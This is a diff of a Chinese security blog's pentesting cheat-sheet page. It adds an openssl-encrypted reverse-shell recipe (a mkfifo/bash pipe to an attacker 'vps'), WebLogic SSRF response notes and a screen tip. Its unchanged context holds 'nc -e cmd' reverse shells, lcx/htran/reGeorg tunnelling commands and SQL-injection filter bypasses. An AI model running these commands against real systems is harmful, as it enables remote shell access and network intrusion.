@@ -80,14 +80,20 @@
 <meta property="og:site_name" content="AdminTony&#39;s Blog">
 <meta property="og:description" content="tips：记录一些记不住的套路">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625420.0412047.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625508.3239238.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625521.3228817.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625533.077504.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625546.1415114.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625558.858544.png">
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201805/1525674593.3304842.png">
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201805/1526481751.2136302.png">
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201805/1526481834.4047837.png">
-<meta property="og:updated_time" content="2019-08-24T04:25:38.906Z">
+<meta property="og:updated_time" content="2019-08-24T05:49:19.815Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="好文章收集">
 <meta name="twitter:description" content="tips：记录一些记不住的套路">
-<meta name="twitter:image" content="https://blog-1252108140.cosbj.myqcloud.com/201805/1525674593.3304842.png">
+<meta name="twitter:image" content="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625420.0412047.png">
 
 
 
@@ -372,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  985 字
+                  1,196 字
                 </span>
               
 
@@ -388,7 +394,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5 分钟
+                  6 分钟
                 </span>
               
             </div>
@@ -420,8 +426,21 @@
 <h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p><a href="https://www.t00ls.net/viewthread.php?tid=43867" target="_blank" rel="noopener">突破防火墙和脚本限制建立代理隧道</a></p>
 <p><a href="https://klionsec.github.io/2017/08/05/ew-tunnel/#menu" target="_blank" rel="noopener">利用 ew 轻松穿透目标多级内网</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nc使用：</span><br><span class="line">　　　　nc.exe -e cmd remoteIP Port</span><br><span class="line">　　　　nc.exe -vv -lp Port</span><br><span class="line">lcx使用：</span><br><span class="line">　　　　lcx.exe -slave remoteIP RPort localIP Port</span><br><span class="line">　　　　lcx.exe listen RPort LPort</span><br><span class="line">htran</span><br><span class="line">正向代理</span><br><span class="line">服务端      htran.exe -s -bind <span class="number">8888</span></span><br><span class="line">客户端      SocksCap:SOCKS Version <span class="number">5</span> 服务端IP:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">反向代理</span><br><span class="line">客户端      htran.exe -s -listen <span class="number">1234</span> <span class="number">8888</span></span><br><span class="line">服务端      htran.exe -s -connect 客户端IP <span class="number">1234</span></span><br><span class="line">客户端      SocksCap:SOCKS Version <span class="number">5</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">正向端口转发</span><br><span class="line">服务端      htran.exe -p -tran <span class="number">8888</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br><span class="line">客户端      RDP 服务端IP:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">反向端口转发</span><br><span class="line">客户端      htran.exe -p -listen <span class="number">1234</span> <span class="number">8888</span></span><br><span class="line">服务端      htran.exe -p -slave 客户端IP <span class="number">1234</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br><span class="line">客户端      RDP <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">reGeo</span><br><span class="line">python reGeorgSocksProxy.py -u http:<span class="comment">//targetURL/tunnel.nosocket.php -p 233</span></span><br></pre></td></tr></table></figure>
+<h2 id="加密反弹shell"><a href="#加密反弹shell" class="headerlink" title="加密反弹shell"></a>加密反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 第一步，在vps上生成SSL证书的公钥/私钥对</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line"></span><br><span class="line"># 第二步，在VPS监听反弹shell</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4433</span><br><span class="line"># 第三步 在目标上用openssl加密反弹shell的流量</span><br><span class="line">mkfifo /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure>
 <h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p><a href="https://www.t00ls.net/viewthread.php?tid=41759" target="_blank" rel="noopener">web全套资料 干货满满 各种文章详解</a></p>
 <p><a href="https://www.t00ls.net/viewthread.php?tid=43860" target="_blank" rel="noopener">MSSQL不使用xp_cmdshell执行命令并获取回显的两种方法</a></p>
+<h2 id="WebLogic-SSRF"><a href="#WebLogic-SSRF" class="headerlink" title="WebLogic SSRF"></a>WebLogic SSRF</h2><p>状态1：IP存在&amp;端口存在</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625420.0412047.png" alt=""></p>
+<p>状态2：端口不存在，ip不存在情况下也是这个</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625508.3239238.png" alt=""></p>
+<p>状态3：漏洞不存在</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625521.3228817.png" alt=""></p>
+<p>状态4：未知</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625533.077504.png" alt=""></p>
+<p>状态5：未知</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625546.1415114.png" alt=""></p>
+<p>状态6：IP存在&amp;端口存在，但端口非http协议</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201908/1566625558.858544.png" alt=""></p>
 <hr>
 <p>SQL注入中过滤了一些字符之后进行注入的方法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> and Polygon(id) #爆表名</span><br><span class="line"> #~ error:Illegal non geometric '`库名`.`当前页面连接的表名`.`所填字段名`' value found during parsing</span><br><span class="line"> #这里的字段必须在这个表中存在 ，如注入点为?id=123则id存在几率较高。</span><br><span class="line"> 1-a(); #爆库名</span><br><span class="line"> #~ error:FUNCTION 库名.a does not exist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 版本5.6.x以上可以用下面的表代替information_schema,</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name</span><br></pre></td></tr></table></figure></p>
 <p><a href="http://www.hackdig.com/?01/hack-477.htm" target="_blank" rel="noopener">绕过IDS过滤information_schema继续注入</a></p>
@@ -488,6 +507,7 @@
 </ul>
 <p>把前面6个a替换成<code>../../</code></p>
 <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526481834.4047837.png" alt=""></p>
+<h1 id="Linux技巧"><a href="#Linux技巧" class="headerlink" title="Linux技巧"></a>Linux技巧</h1><h2 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、screen 进入session</span><br><span class="line">2、在session中按下：Ctrl+A 后再按D 回到主机器</span><br><span class="line">3、screen -ls  查看session</span><br><span class="line">4、screen -r xxxx   进入session</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -619,7 +639,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-count">62</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
@@ -630,7 +650,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-count">79</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -641,7 +661,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">126</span>
+                  <span class="site-state-item-count">128</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -708,7 +728,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#加用户"><span class="nav-number">1.</span> <span class="nav-text">加用户</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cmd上传文件"><span class="nav-number">2.</span> <span class="nav-text">cmd上传文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Office漏洞"><span class="nav-number">3.</span> <span class="nav-text">Office漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码混淆"><span class="nav-number">4.</span> <span class="nav-text">代码混淆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透"><span class="nav-number">5.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#域渗透"><span class="nav-number">5.1.</span> <span class="nav-text">域渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网代理"><span class="nav-number">5.2.</span> <span class="nav-text">内网代理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试"><span class="nav-number">6.</span> <span class="nav-text">渗透测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#git使用"><span class="nav-number">7.</span> <span class="nav-text">git使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python"><span class="nav-number">8.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重装系统后恢复博客"><span class="nav-number">9.</span> <span class="nav-text">重装系统后恢复博客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-安装Git-Bash"><span class="nav-number">9.1.</span> <span class="nav-text">1.安装Git Bash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-安装NodeJs"><span class="nav-number">9.2.</span> <span class="nav-text">2.安装NodeJs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-安装hexo"><span class="nav-number">9.3.</span> <span class="nav-text">3.安装hexo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-搭桥GitHub"><span class="nav-number">9.4.</span> <span class="nav-text">4.搭桥GitHub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-搜索插件"><span class="nav-number">9.5.</span> <span class="nav-text">5.搜索插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-安装字数统计插件"><span class="nav-number">9.6.</span> <span class="nav-text">6.安装字数统计插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-安装sitemap插件"><span class="nav-number">9.7.</span> <span class="nav-text">7.安装sitemap插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-安装置顶插件"><span class="nav-number">9.8.</span> <span class="nav-text">8.安装置顶插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-自动推送"><span class="nav-number">9.9.</span> <span class="nav-text">9.自动推送</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何创建-a-php的压缩包"><span class="nav-number">10.</span> <span class="nav-text">如何创建../../a.php的压缩包</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#加用户"><span class="nav-number">1.</span> <span class="nav-text">加用户</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cmd上传文件"><span class="nav-number">2.</span> <span class="nav-text">cmd上传文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Office漏洞"><span class="nav-number">3.</span> <span class="nav-text">Office漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码混淆"><span class="nav-number">4.</span> <span class="nav-text">代码混淆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透"><span class="nav-number">5.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#域渗透"><span class="nav-number">5.1.</span> <span class="nav-text">域渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网代理"><span class="nav-number">5.2.</span> <span class="nav-text">内网代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加密反弹shell"><span class="nav-number">5.3.</span> <span class="nav-text">加密反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试"><span class="nav-number">6.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WebLogic-SSRF"><span class="nav-number">6.1.</span> <span class="nav-text">WebLogic SSRF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#git使用"><span class="nav-number">7.</span> <span class="nav-text">git使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python"><span class="nav-number">8.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重装系统后恢复博客"><span class="nav-number">9.</span> <span class="nav-text">重装系统后恢复博客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-安装Git-Bash"><span class="nav-number">9.1.</span> <span class="nav-text">1.安装Git Bash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-安装NodeJs"><span class="nav-number">9.2.</span> <span class="nav-text">2.安装NodeJs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-安装hexo"><span class="nav-number">9.3.</span> <span class="nav-text">3.安装hexo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-搭桥GitHub"><span class="nav-number">9.4.</span> <span class="nav-text">4.搭桥GitHub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-搜索插件"><span class="nav-number">9.5.</span> <span class="nav-text">5.搜索插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-安装字数统计插件"><span class="nav-number">9.6.</span> <span class="nav-text">6.安装字数统计插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-安装sitemap插件"><span class="nav-number">9.7.</span> <span class="nav-text">7.安装sitemap插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-安装置顶插件"><span class="nav-number">9.8.</span> <span class="nav-text">8.安装置顶插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-自动推送"><span class="nav-number">9.9.</span> <span class="nav-text">9.自动推送</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何创建-a-php的压缩包"><span class="nav-number">10.</span> <span class="nav-text">如何创建../../a.php的压缩包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux技巧"><span class="nav-number">11.</span> <span class="nav-text">Linux技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#screen命令"><span class="nav-number">11.1.</span> <span class="nav-text">screen命令</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -742,7 +762,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">57.4k</span>
+    <span title="Site words total count">58.5k</span>
   
 </div>
 
